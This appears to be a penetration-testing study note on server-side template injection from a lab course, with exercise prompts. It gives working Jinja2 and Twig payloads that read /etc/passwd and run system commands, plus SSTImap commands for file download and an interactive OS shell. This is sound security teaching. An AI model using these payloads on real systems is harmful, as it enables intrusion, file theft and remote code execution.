# 🧑‍🎤 SSTI

A template engine is software that combines pre-defined templates with dynamically generated data and is often used by web applications to generate dynamic responses. An everyday use case for template engines is a website with shared headers and footers for all pages.

Popular examples of template engines are [Jinja](https://jinja.palletsprojects.com/en/3.1.x/) and [Twig](https://twig.symfony.com/).

Usually, a template engine requires a template and a set of values to be inserted into the template.

Let's consider Jinja ->

```jinja2
Hello {{ name }}!
```

We can see the variable called `name`, which is replaced with a dynamic value during rendering. So `name="vautia" will` render ->

```
Hello vautia!
```

but we can start to imagine more complexe stuff with loops ->

```jinja2
{% raw %}
{% for name in names %}
Hello {{ name }}!
{% endfor %}
{% endraw %}
```

```
Hello vautia!
Hello 21y4d!
Hello Pedant!
```

So our goal is to inject templating code into a template that is later rendered by the server.

## Identifying SSTI

It's very similar to as an SQL injection to identify: we inject special characters with semantic meaning in template engines and observe the web application's behavior

The following chars have a high chance of breaking the template:

```
${{<%[%'"}}%\.
```

Let's imagine the follwoing web app when we enter the name "vautia"

<figure><img src="../../../.gitbook/assets/image (1343).png" alt=""><figcaption></figcaption></figure>

And if we enter the string we saw earlier:

<figure><img src="../../../.gitbook/assets/image (1344).png" alt=""><figcaption><p>vulnerable to SSTI</p></figcaption></figure>

### Identifying Template Engine

<figure><img src="../../../.gitbook/assets/image (1345).png" alt=""><figcaption></figcaption></figure>

`${7*7}` is very famous, let's try it out ->

_**Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.**_

<figure><img src="../../../.gitbook/assets/image (1346).png" alt=""><figcaption></figcaption></figure>

## Exploiting Jinja2

Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django` and we will be exploiting assuming we're on Flask

#### _**Information Disclosure ->**_

the web application's configuration:

```jinja2
{{ config.items() }}
```

dump all available built-in functions:

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

Local file inclusion:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Remote code execution:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

_**Exploit the SSTI vulnerability to obtain RCE and read the flag.**_

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

<figure><img src="../../../.gitbook/assets/image (1347).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1348).png" alt=""><figcaption></figcaption></figure>

## Exploiting Twig

information about the current template:

```twig
{{ _self }}
```

the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file\_excerpt](https://symfony.com/doc/current/reference/twig\_reference.html#file-excerpt) and can be used to read local files.

Local file inclusion:

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

For RCE we can use the PHP built-in function `system`. We can pass an argument to \{{this function by using Twig's `filter` function

```twig
{{ ['id'] | filter('system') }}
```

{% hint style="success" %}
We can find the syntax for the other templates on the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
{% endhint %}

## SSTI Tools

We can use [SSTImap](https://github.com/vladko312/SSTImap) to aid the SSTI exploitation process.

```shell-session
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py 
```

And to use the tool this is the syntax:

```shell-session
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

download a remote file to our local machine with the `-D` flag

```shell-session
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

execute a system command using the `-S` flag

```shell-session
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

we can use `--os-shell` to obtain an interactive shell

```shell-session
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```
